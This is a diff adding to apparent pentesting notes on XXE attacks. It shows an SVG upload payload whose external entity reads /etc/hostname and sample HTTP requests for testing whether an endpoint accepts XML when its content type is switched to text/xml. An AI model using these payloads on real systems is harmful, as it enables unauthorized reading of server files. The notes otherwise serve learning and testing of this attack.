@@ -20,3 +20,22 @@ the svg should look like this -->
 <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
 
 then we need to upload file to get XXE
+
+
+
+3. XXE using modified content type
+some website use use different content type like json or urlencode 
+if a website tolerated text/xml content type then there could be an attack surface 
+eg.
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+if the obove request is accepted we can use our payload to attack the applciation
